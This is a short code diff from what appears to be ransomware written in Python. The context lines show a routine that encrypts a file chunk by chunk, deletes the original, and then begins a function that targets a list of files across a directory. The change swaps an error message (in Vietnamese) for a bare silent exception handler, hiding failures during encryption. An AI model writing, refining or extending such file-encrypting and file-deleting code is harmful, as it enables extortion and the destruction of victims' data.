@@ -197,8 +197,8 @@ def encrypt_file(path, key, chunk_size=268435456):
                 encrypted_chunk = cipher.encrypt(chunk)
                 f_out.write(encrypted_chunk)
         os.remove(path)
-    except Exception as e:
-        print(f"Lỗi: {e}")
+    except:
+        pass
 
 def encrypt_directory(directory_path, key):
     files_targeted = [
